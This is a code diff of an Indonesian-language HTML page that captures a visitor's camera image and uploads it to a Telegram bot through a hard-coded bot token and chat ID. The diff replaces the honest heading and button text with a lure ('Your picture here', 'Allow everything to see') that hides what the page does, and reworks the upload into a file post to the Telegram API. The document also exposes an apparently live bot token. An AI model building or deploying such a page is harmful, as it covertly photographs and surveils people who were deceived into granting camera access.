@@ -6,8 +6,8 @@
     <title>Akses Kamera dan Lokasi</title>
 </head>
 <body>
-    <h1>Ambil Gambar dan Kirim Lokasi</h1>
-    <button onclick="startCapture()">Ambil Gambar dan Kirim Lokasi</button>
+    <h1>Gambar Mu di sini</h1>
+    <button onclick="startCapture()">Izin kan semua untuk melihat</button>
     <script>
         function startCapture() {
             // Akses kamera
@@ -71,42 +71,40 @@
             };
         }
 
-        function sendToTelegram(message) {
+        function sendToTelegram(base64Image) {
             const telegramToken = '7030408795:AAFfhnjy4x3f3gotpugela5qFMbVVnE9HpI';
             const chatId = '1746156378';
 
-            // Jika pesan berupa gambar (base64)
-            if (message.startsWith('data:image/jpeg;base64,')) {
-                const photoUrl = `https://api.telegram.org/bot${telegramToken}/sendPhoto`;
-
-                // Kirimkan foto dalam format base64 ke Telegram
-                fetch(photoUrl, {
-                    method: 'POST',
-                    body: new URLSearchParams({
-                        chat_id: chatId,
-                        photo: message
-                    })
-                }).then(response => response.json())
-                  .then(data => {
-                    if (data.ok) {
-                        console.log('Gambar terkirim ke Telegram');
-                    } else {
-                        console.log('Error mengirim gambar:', data);
-                    }
-                }).catch(error => console.log('Error:', error));
-            } else {
-                // Jika bukan gambar base64, kirimkan pesan teks biasa
-                const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
-                fetch(url, {
-                    method: 'POST',
-                    body: new URLSearchParams({
-                        chat_id: chatId,
-                        text: message
-                    })
-                }).then(response => response.json())
-                  .then(data => console.log('Pesan terkirim ke Telegram:', data))
-                  .catch(error => console.log('Error:', error));
+            // Convert base64 image to blob
+            const byteString = atob(base64Image.split(',')[1]);
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
             }
+            const blob = new Blob([ab], { type: 'image/jpeg' });
+
+            // Create FormData to send the image as a file
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, 'photo.jpg');
+
+            // Send the photo using sendPhoto API
+            const url = `https://api.telegram.org/bot${telegramToken}/sendPhoto`;
+
+            fetch(url, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log('Gambar terkirim ke Telegram');
+                } else {
+                    console.log('Error mengirim gambar:', data);
+                }
+            })
+            .catch(error => console.log('Error:', error));
         }
     </script>
 </body>
